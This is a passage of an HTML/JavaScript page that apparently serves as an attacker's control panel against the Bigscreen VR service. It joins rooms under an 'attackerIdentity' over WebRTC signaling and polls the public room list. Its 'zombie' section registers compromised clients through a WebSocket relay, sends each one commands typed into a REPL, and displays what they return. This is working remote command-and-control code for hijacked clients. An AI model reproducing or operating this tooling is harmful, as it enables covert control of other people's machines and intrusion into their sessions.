                let beforeCandidate  = message.value.slice(0,candidateStartPos);
                let sdpMLineIndex = beforeCandidate.slice(0, beforeCandidate.indexOf('bigscreen_sdp_mline_index'));
                let sdpMid = beforeCandidate.slice(
                    beforeCandidate.indexOf('bigscreen_sdp_mline_index') + 'bigscreen_sdp_mline_index'.length,
                    beforeCandidate.indexOf('bigscreen_sdp_mid'));
                let candidate = new RTCIceCandidate({
                    sdpMid: sdpMid,
                    sdpMLineIndex: sdpMLineIndex,
                    candidate: message.value.slice(candidateStartPos)
                });
                {
                    if( ! this.roomParticipants[message.fromUser]){
                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC ICE.');
                        return;
                    }
                    if( ! this.roomParticipants[message.fromUser].connections[message.PCID]){
                        console.error('ERROR', 'Connection object was not found in connections of sender of this received WebRTC ICE.');
                        return;
                    }
                    let connection = this.roomParticipants[message.fromUser].connections[message.PCID];
                    console.log('ice conn', connection);
                    connection.rtcPeerConnection.addIceCandidate(candidate);
                }
                break;
            case 'offer':
                console.log('onMessage received OFFER');
                console.assert(message.fromDevice === 'desktop', message.fromDevice);

                {
                    let roomParticipant = this.roomParticipants[message.fromUser];
                    if( ! roomParticipant){
                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC SDP Offer.');
                        return;
                    }
                    let connection = new Connection(message.SCID, message.PCID, roomParticipant);
                    roomParticipant.connections[message.PCID] = connection;

                    if (!connection.isInitiator && !connection.isStarted) {
                        connection.maybeStart();
                    }
                    connection.rtcPeerConnection.setRemoteDescription(new RTCSessionDescription(
                        {type: message.type, sdp: message.value, SCID: connection.scid, pcid: connection.pcid}));
                    connection.doAnswer();
                }
                break;
            case 'answer':
                console.error('onMessage received ANSWER');

                console.assert(message.roomId === this.roomId, message.roomId, this.roomId);
                console.assert(message.targetUser === this.attackerIdentity.userId, message.targetUser, this.attackerIdentity.userId);
                console.assert(message.fromDevice === 'desktop', message.fromDevice);
                console.assert(message.targetDevice === 'desktop', message.targetDevice);
                {
                    if( ! this.roomParticipants[message.fromUser]){
                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC SDP Answer.');
                        return;
                    }
                    if( ! this.roomParticipants[message.fromUser].connections[message.PCID]){
                        console.error('ERROR', 'Connection object was not found in connections of sender of this received WebRTC SDP Answer.');
                        return;
                    }
                    let connection = this.roomParticipants[message.fromUser].connections[message.PCID];
                    if (connection.isStarted) {
                        connection.setRemoteDescription(new RTCSessionDescription(
                            {
                                type: message.type,
                                sdp: message.value,
                                scid: connection.scid,
                                pcid: connection.pcid
                            }));
                    }
                }
                break;
            default:
                console.error('Unexpected message type (server to client):', message);
                break;
        }
    };


}


////////////////////////////////////////////////

function generateBigscreenUuid() {
  function bigscreenRand() {
    return Math["floor"]((1 + Math["random"]()) * 65536).toString(16) ["substring"](1)
  }
  return bigscreenRand() + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + bigscreenRand() + bigscreenRand()
}

/*
if (location.hostname !== 'localhost') {
    requestTurn(
        'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
    );
}

function requestTurn(turnURL) {
    let turnExists = false;
    for (let i in pcConfig.iceServers) {
        if (pcConfig.iceServers[i].urls.substr(0, 5) === 'turn:') {
            turnExists = true;
            turnReady = true;
            break;
        }
    }
    if (!turnExists) {
        console.log('Getting TURN server from ', turnURL);
        // No TURN server. Get one from computeengineondemand.appspot.com:
        let xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                let turnServer = JSON.parse(xhr.responseText);
                console.log('Got TURN server: ', turnServer);
                pcConfig.iceServers.push({
                    'urls': 'turn:' + turnServer.username + '@' + turnServer.turn,
                    'credential': turnServer.password
                });
                turnReady = true;
            }
        };
        xhr.open('GET', turnURL, true);
        xhr.send();
    }
}
*/




function sendZombieCmd(zombieUuid, cmd){
    console.debug('sendZombieCmd', zombieUuid, cmd);
    messageRelayWs.send(JSON.stringify({
        type: "zombie-cmd",
        uuid: zombieUuid,
        cmd: cmd
    }));
}

let zombies = [];
var messageRelayWs = new WebSocket('ws://127.0.0.1:8081');
messageRelayWs.onopen = function(){
    messageRelayWs.send(JSON.stringify({type:'control-panel-connect'}));
};
messageRelayWs.onmessage = function(event){
    let message = JSON.parse(event.data);
    console.log("messageRelayWs received:", message);
    switch (message.type) {
        case 'chat':
            rooms[message.roomId].roomUI.renderChatMessage(message.message, message.name, new Date());
            break;
        case 'zombie-register': {
            console.log('New zombie:', message.uuid);
            zombies.push(message.uuid);

            let repl = repls[message.uuid];
            repl.formElement.addEventListener("submit", function (event) {
                event.preventDefault();
                let cmd = repl.inputElement.value;
                repl.inputElement.value = '';
                repl.renderCmd(cmd);
                sendZombieCmd(message.uuid, cmd);
            });

            break;
        }
        case 'zombie-result': {
            console.log('Zombie :', message.uuid, 'Result:', message.result);
            repls[message.uuid].renderResult(message.result);
            break;
        }
        default:
            console.warn('messageRelayWs unexpected message');
    }
};


function PublicRoomsManager(){
    let that = this;
    this.sendSignalingMessage = function(message) {
        this.signalingWs.send(msgpack.encode(message));
    };
    this.onSignalingMessage = function(event){
        let message = msgpack.decode(new Uint8Array(event.data));
        if(message.type === 'room-latest'){
            that.publicRoomsUI.hideAllRooms();
            that.publicRoomsUI.addAllRooms(message.rooms);
        }
        else{
            console.warn('WARN', 'PublicRoomsManager.onSignalingMessage: Unexpected message:', message);
        }
    };

    this.publicRoomsUI = new PublicRoomsUI(this);
    this.intervalId = null;

    this.signalingWs = new WebSocket(bigscreenSignalUrl);
    this.signalingWs.binaryType = 'arraybuffer';
    this.signalingWs.onopen = function (event) {
        that.sendSignalingMessage({type: 'register-desktop'});
    };
    this.signalingWs.onclose = function (event) {
        console.debug('PublicRoomson.signalingWs.onclose', event);
    };
    this.signalingWs.onmessage = function (event) {
        that.onSignalingMessage(event);
    };
    this.signalingWs.onerror = function (event) {
        console.error('ERROR', 'PublicRoomsManager.signalingWs.onerror', event);

    };

    this.startPeriodicUpdates = function(){
        if(this.intervalId !== null){
            console.error('ERROR', 'Periodic updates already started.');
            return;
        }

        that.sendSignalingMessage({type: "room-latest"}); // update now
        this.intervalId = setInterval(function(){
            that.sendSignalingMessage({type: "room-latest"});
        },5000); // NOTE: original Bigscreen application uses interval 5000
    };

    this.stopPeriodicUpdates = function(){
        if(this.intervalId === null){
            console.error('ERROR', 'Cannot stop. Periodic updates are not running.');
            return;
        }
        clearInterval(this.intervalId);
        this.intervalId = null;
    };

    this.togglePeriodicUpdates = function(){
        if(this.intervalId === null){
            this.startPeriodicUpdates();
        }
        else{
            this.stopPeriodicUpdates();
        }
    }
}

function PublicRoomsUI(publicRooms){
    // TODO Maybe dynamically insert html
    let that = this;
    this.publicRooms = publicRooms;
    this.publicRoomsCardElement = document.getElementById('publicRooms');
    this.publicRoomsListElement = this.publicRoomsCardElement.getElementsByTagName('ul')[0];
    this.updatedTimeElement = this.publicRoomsCardElement.querySelector('.card-footer time');
    this.autorefreshInput = this.publicRoomsCardElement.querySelector('.card-footer .form-check input');
    this.autorefreshInput.checked = false;

    this.hideAllRooms = function(){
        this.publicRoomsListElement.innerHTML = '';
    };

    this.addAllRooms = function(rooms){
        let that = this;
        rooms.forEach(function(room){
            let roomElement = document.createElement('li');
            roomElement.classList.add('list-group-item');
            let nameElement = document.createElement('b');
            nameElement.appendChild(document.createTextNode(room.name));
            roomElement.appendChild(nameElement);
            roomElement.appendChild(document.createTextNode(' · ' + room.description));
            roomElement.appendChild(document.createElement('br'));
            let roomIdElement = document.createElement('code');
            roomIdElement.appendChild(document.createTextNode(room.roomId));
            roomElement.appendChild(roomIdElement);
            roomElement.appendChild(document.createTextNode(' (' + room.participants + '/' + room.size + ')'));
            that.publicRoomsListElement.appendChild(roomElement);
        });
        this.updateFooter();
    };

    this.updateFooter = function(){
        this.updatedTimeElement.innerHTML = '';
        this.updatedTimeElement.appendChild(
            document.createTextNode((new Date).toLocaleTimeString())
        );
    };

    this.autorefreshInput.addEventListener("click", function (event) {
        that.publicRooms.togglePeriodicUpdates();
    });
}

let publicRooms = new PublicRoomsManager();

</script>
</body>
</html>
